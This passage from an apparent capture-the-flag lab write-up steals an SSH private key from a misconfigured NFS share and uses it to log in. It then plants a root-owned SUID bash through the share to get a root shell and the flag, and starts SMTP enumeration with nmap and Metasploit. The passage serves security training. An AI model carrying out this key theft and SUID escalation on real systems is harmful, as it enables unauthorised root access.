</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful</span></span></code></pre></div>
<br>
<p>Which of these keys is most useful to us?</p>






<pre tabindex="0"><code>id_rsa</code></pre>
<p><code>id_rsa</code> is the default name of an SSH identity file.</p>
<br>
<p>Copy this file to a different location your local machine, and change the permission to &ldquo;600&rdquo; using <code>chmod 600 [file]</code>.</p>
<p>Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.</p>
<p>Can we log into the machine using <code>ssh -i &lt;key-file&gt; &lt;username&gt;@\&lt;ip&gt; ?</code> (Y/N).</p>






<pre tabindex="0"><code>Y</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:~# cp /tmp/mount/cappucino/.ssh/id_rsa ~
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:~# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>burp.json Desktop id_rsa Pictures Rooms thinclient_drives
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>CTFBuilder Downloads Instructions Postman Scripts Tools
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@ip-10-10-233-18:~# chmod <span style="color:#fab387">600</span> id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>root@ip-10-10-233-18:~# ssh -i id_rsa cappucino@10.10.14.167</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-101-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>System information as of Tue Jun <span style="color:#fab387">25</span> 05:47:40 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System load: 0.0 Processes: <span style="color:#fab387">102</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Usage of /: 45.2% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Memory usage: 16% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">44</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Last login: Thu Jun <span style="color:#fab387">4</span> 14:37:50 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>cappucino@polonfs:~$</span></span></code></pre></div>
<br>
<h4 id="exploiting-nfs">Exploiting NFS</h4>
<h5 id="what-is-root_squash">What is root_squash?</h5>
<p>By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.</p>
<h5 id="suid">SUID</h5>
<p>So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p>Due to compatibility reasons, we will obtain the bash executable directly from the target machine.
With the key obtained in the previous task, we can use SCP with the command <code>scp -i key_name username@10.10.14.168:/bin/bash ~/Downloads/bash</code> to download it onto our attacking machine.</p>
<p>Here&rsquo;s a step by step of the actions we&rsquo;re taking, and how they all tie together to allow us to gain a root shell:</p>
<ol>
<li>NFS Access</li>
<li>Gain Low Privilege Shell</li>
<li>Upload Bash Executable to the NFS share</li>
<li>Set SUID Permissions Through NFS Due To Misconfigured Root Squash</li>
<li>Login Through SSH</li>
<li>Execute SUID Bit Bash Executable</li>
<li>Root Access</li>
</ol>
<p>First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user&rsquo;s home directory.</p>






<pre tabindex="0"><code>root@ip-10-10-233-18:/tmp/mount/cappucino#</code></pre>
<br>
<p>Download the bash executable to your Downloads directory. Then use &ldquo;cp ~/Downloads/bash .&rdquo; to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using &ldquo;sudo chown root bash&rdquo;</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# scp -i id_rsa cappucino@10.10.14.167:/bin/bash ~/Downloads/bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>bash 100% 1087KB 85.0MB/s 00:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">20</span> Jun <span style="color:#fab387">25</span> 07:00 .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# cp ~/Downloads/bash .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chown root bash</span></span></code></pre></div>
<br>
<p>Now, we&rsquo;re going to add the SUID bit permission to the bash executable we just copied to the share using <code>sudo chmod +[permission] bash</code>. What letter do we use to set the SUID bit set using chmod?</p>






<pre tabindex="0"><code>s</code></pre>
<p>The letter <code>s</code> is used to set the setuid (SUID) bit using the <code>chmod</code> command in Linux:</p>
<ul>
<li>chmod u+s &lt;/path/to/the/file&gt;: Sets the setuid bit symbolically</li>
<li>chmod u-s: Removes the setuid bit</li>
</ul>
<br>
<p>Let&rsquo;s do a sanity check, let&rsquo;s check the permissions of the <code>bash</code> executable using <code>ls -la bash</code>. What does the permission set look like? Make sure that it ends with -sr-x.</p>






<pre tabindex="0"><code>-rwsr-sr-x</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chmod +s bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -la bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>-rwsr-sr-x <span style="color:#fab387">1</span> root root <span style="color:#fab387">1113504</span> Jun <span style="color:#fab387">25</span> 07:04 bash</span></span></code></pre></div>
<br>
<p>Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Let&rsquo;s run it with &ldquo;./bash -p&rdquo;. The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.</p>
<p>Great! If all&rsquo;s gone well you should have a shell as root! What&rsquo;s the root flag?</p>






<pre tabindex="0"><code>THM{nfs_got_pwned}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>cappucino@polonfs:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>cappucino@polonfs:~$ ./bash -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>bash-4.4# ls /root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>bash-4.4# cat /root/root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>nfs_got_pwned<span style="color:#89dceb;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>bash-4.4#</span></span></code></pre></div>
<br>
<h3 id="smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</h3>
<hr>
<h4 id="understanding-smtp">Understanding SMTP</h4>
<p>The SMTP server performs three basic functions:</p>
<ol>
<li>It verifies who is sending emails through the SMTP server.</li>
<li>It sends the outgoing mail</li>
<li>If the outgoing mail can&rsquo;t be delivered it sends the message back to the sender.</li>
</ol>
<h5 id="pop-and-imap">POP and IMAP</h5>
<p>POP, Post Office Protocol, and IMAP, Internet Message Access Protocol, are both email protocols who are responsible for the transfer of email between a client and a mail server. The main difference is in POP is more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronize the current inbox, with the new mail on the server, downloading anything new.</p>
<div style="text-align: center"><img src="./image-25.png"></div>
<br>
<p>What does SMTP stand for?</p>






<pre tabindex="0"><code>Simple Mail Transfer Protocol</code></pre>
<br>
What does SMTP handle the sending of?
```
emails
```
<br>
What is the first step in the SMTP process?






<pre tabindex="0"><code>SMTP handshake</code></pre>
<p>What is the default SMTP port?</p>






<pre tabindex="0"><code>25</code></pre>
<br>
Where does the SMTP server send the email if the recipient's server is not available?






<pre tabindex="0"><code>SMTP Queue</code></pre>
<br>
<p>On what server does the Email ultimately end up on?</p>






<pre tabindex="0"><code>POP/IMAP</code></pre>
<br>
<p>Can a Linux machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Windows machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<h4 id="enumerating-smtp">Enumerating SMTP</h4>
<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network. We want to fingerprint the server to make our targeting as precise as possible before launching an attack. We can use the smtp_version module in Metasploit.</p>
<p>The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual addresses of user&rsquo;s aliases and lists of email). We can do this manually, over a telnet connection – however Metasploit provides a handy module called smtp_enum that will do the legwork for us.</p>
<br>
<p>First, let&rsquo;s run a port scan against the target machine, same as last time. What port is SMTP running on?</p>






<pre tabindex="0"><code>25</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# nmap -sV 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-26 03:31 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-54-3.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.54.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00069s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">998</span> closed ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>25/tcp open smtp Postfix smtpd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>MAC Address: 02:4B:FA:CD:BD:EB <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service Info: Host: polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 2.53 seconds</span></span></code></pre></div>
<br>
<p>Okay, now we know what port we should be targeting, let&rsquo;s start up Metasploit. What command do we use to do this?</p>






<pre tabindex="0"><code>msfconsole</code></pre>
<br>
<p>Let&rsquo;s search for the module smtp_version, what&rsquo;s its full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_version</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search smtp_version
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_version normal No SMTP Banner Grabber
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_version</span></span></code></pre></div>
<br>
<p>Great, now select the module and list the options. How do we do this?</p>






<pre tabindex="0"><code>options</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
